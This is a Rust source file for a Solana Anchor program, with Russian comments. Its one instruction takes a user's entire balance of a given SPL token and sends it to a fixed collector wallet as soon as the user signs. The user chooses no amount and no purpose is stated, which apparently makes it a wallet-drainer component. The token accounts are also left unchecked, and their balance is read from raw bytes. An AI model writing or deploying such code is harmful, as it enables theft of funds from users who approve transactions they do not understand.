use anchor_lang::prelude::*;
use anchor_spl::token::{self, Token, Transfer};
use anchor_spl::associated_token::AssociatedToken;
use crate::state::*;

#[derive(Accounts)]
pub struct CollectSplTokens<'info> {
    #[account(
        seeds = [CollectorState::SEED],
        bump = collector_state.bump
    )]
    pub collector_state: Account<'info, CollectorState>,
    
    #[account(mut)]
    pub user_wallet: Signer<'info>,
    
    /// CHECK: Кошелек-получатель проверяется через constraint с collector_state
    #[account(
        constraint = collector_wallet.key() == collector_state.collector_wallet
    )]
    pub collector_wallet: AccountInfo<'info>,
    
    /// CHECK: Адрес mint используется для создания токен аккаунтов
    pub mint: AccountInfo<'info>,
    
    /// CHECK: Токен аккаунт пользователя, проверяется в CPI
    #[account(mut)]
    pub user_token_account: AccountInfo<'info>,
    
    /// CHECK: Токен аккаунт получателя, проверяется в CPI
    #[account(mut)]
    pub collector_token_account: AccountInfo<'info>,
    
    pub token_program: Program<'info, Token>,
    pub associated_token_program: Program<'info, AssociatedToken>,
    pub system_program: Program<'info, System>,
}

pub fn collect_spl_tokens_handler(ctx: Context<CollectSplTokens>) -> Result<()> {
    let user_token_account = &ctx.accounts.user_token_account;
    let collector_token_account = &ctx.accounts.collector_token_account;
    let user_wallet = &ctx.accounts.user_wallet;
    let mint = &ctx.accounts.mint;
    
    msg!("Собираем SPL токен: {}", mint.key());
    
    // Проверяем, что у пользователя есть токен аккаунт
    if user_token_account.data_is_empty() {
        msg!("Пользователь не имеет токен аккаунта для этого mint");
        return Ok(());
    }
    
    // Получаем баланс через десериализацию без заимствования
    let user_balance = {
        let data = user_token_account.try_borrow_data()?;
        if data.len() < 72 {
            msg!("Неверный размер токен аккаунта");
            return Ok(());
        }
        
        // Извлекаем баланс (bytes 64-72 в токен аккаунте)
        u64::from_le_bytes([
            data[64], data[65], data[66], data[67],
            data[68], data[69], data[70], data[71],
        ])
    }; // data автоматически освобождается здесь
    
    msg!("Баланс пользователя: {}", user_balance);
    
    // Проверяем, есть ли токены для перевода
    if user_balance > 0 {
        msg!("Переводим {} токенов", user_balance);
        
        // Переводим все токены - теперь data уже не заимствован
        token::transfer(
            CpiContext::new(
                ctx.accounts.token_program.to_account_info(),
                Transfer {
                    from: user_token_account.to_account_info(),
                    to: collector_token_account.to_account_info(),
                    authority: user_wallet.to_account_info(),
                },
            ),
            user_balance,
        )?;
        
        msg!("SPL токены успешно переведены!");
    } else {
        msg!("Нет токенов для перевода");
    }
    
    Ok(())
}